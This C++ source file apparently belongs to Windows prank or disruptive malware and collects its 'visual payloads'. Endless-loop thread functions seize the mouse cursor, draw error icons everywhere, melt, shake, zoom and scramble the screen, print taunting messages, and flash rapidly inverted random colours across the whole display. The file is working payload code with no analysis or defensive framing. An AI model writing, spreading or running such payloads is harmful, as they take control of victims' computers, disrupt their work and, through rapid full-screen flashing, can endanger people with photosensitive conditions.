/*
 * Every visual payload is here!
*/

#include <windows.h>

namespace VisualPayloads {
	
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	
	DWORD WINAPI crazyMouse(LPVOID lpParameter){
		POINT p;
		while (1){
			GetCursorPos(&p);
			if (rand() % 2 == 1)
				SetCursorPos(p.x + rand() % 10, p.y + rand() % 10);
			else
				SetCursorPos(p.x - rand() % 10, p.y - rand() % 10);
			Sleep(100);
		}
		return 0;
	}
	
	DWORD WINAPI crazyIcons(LPVOID lpParameter){
		HDC dc = GetDC(NULL);
		HICON icon = LoadIconA(NULL, IDI_ERROR);
		while (1){
			DrawIcon(dc, rand() % w, rand() % h, icon);
			Sleep(100);
		}
		return 0;
	}
	
	/*
		GDI Payloads
	*/
	DWORD WINAPI meltingScreen(LPVOID lpParameter){

		HDC DC = GetDC(NULL);
		
		int i = -100;
		
		while (1){
			if (rand() % 2 == 1)
				BitBlt(DC, i, rand() % 10, rand() % 100, h, DC, i, 0, SRCCOPY);
			else
				BitBlt(DC, i, -rand() % 10, rand() % 100, h, DC, i, 0, SRCCOPY);
			
			i > w ? i = -100 : i += 100;
		}
	}
	
	DWORD WINAPI hatingTexts(LPVOID lpParameter){
		
		const char* strings[6] = {
			"Back to Windows 95!",
			"Millenium!",
			"XP forever!",
			"End of times...",
			"Happy new Year!",
			"The Marshall Mathers"
		};
		int size[6] = {19, 10, 11, 15, 15, 20};

		HDC DC = GetDC(NULL);
		int n = 0;
		
		while (1){
			n = rand() % 6;
			
			SetTextColor(DC, RGB(rand() % 255, rand() % 255, rand() % 255));
			SetBkColor(DC, RGB(rand() % 255, rand() % 255, rand() % 255));
			
			TextOutA(DC, rand() % w, rand() % h, strings[n], size[n]);
			
			Sleep(10);
		}
	}
	
	DWORD WINAPI screenShaker(LPVOID lpParameter){
		
		HDC DC = GetDC(NULL);
		
		while (1)
			StretchBlt(DC,rand() % 5, rand() % 5, w, h, DC, rand() % 5, rand() % 5, w, h, SRCCOPY);
	}
		
	DWORD WINAPI hypnosis(LPVOID lpParameter){
		
		HDC DC = GetDC(NULL);
		
		while (1){
			StretchBlt(DC, 20, 20, w-20, h-20, DC,	0, 0, w+20, h+20, PATINVERT | SRCCOPY);
			Sleep(200);
		}
	}

	DWORD WINAPI brilhoso(LPVOID lpParameter){
		
		HDC DC = GetDC(NULL);
		
		while (1){
			SetDCBrushColor(DC, RGB(rand() % 255, rand() % 255, rand() % 255));
			
			SelectObject(DC, GetStockObject(DC_BRUSH));
			
			PatBlt(DC, 0, 0, w, h, PATINVERT);
			
			Sleep(10);
		}
	}
	
	DWORD WINAPI garbage(LPVOID lpParameter){
		
		HDC DC = GetDC(NULL);
		int x = 0, y = 0, r = 0, g = 0, b = 0;
		
		while (1){
			
			r = g = b = rand() % 255;
			
			if (x > w){
				x = 0;
				y++;
			} else if (y > h)
				y = 0;
			
			SetPixel(DC, x, y, RGB(r, g, b));
			x++;
		}
	}
	
	DWORD WINAPI zoom(LPVOID lpParameter){
		
		HDC DC = GetDC(NULL);
		
		int i = 0;
	
		while(1){
			StretchBlt(DC, 0, 0, w + i, h + i, DC, 0, 0, w - i, h - i, SRCCOPY | SRCINVERT);
			i > h ? i = 0 : i++;
			Sleep(10);
		}
	}
	
	DWORD WINAPI puzzle(LPVOID lpParameter){
		
		HDC DC = GetDC(NULL);
		
		while (1){
			BitBlt(DC, rand() % w, rand() % h, rand() % w, rand() % h, DC, 0, 0, SRCCOPY);
			Sleep(10);
		}
	}
}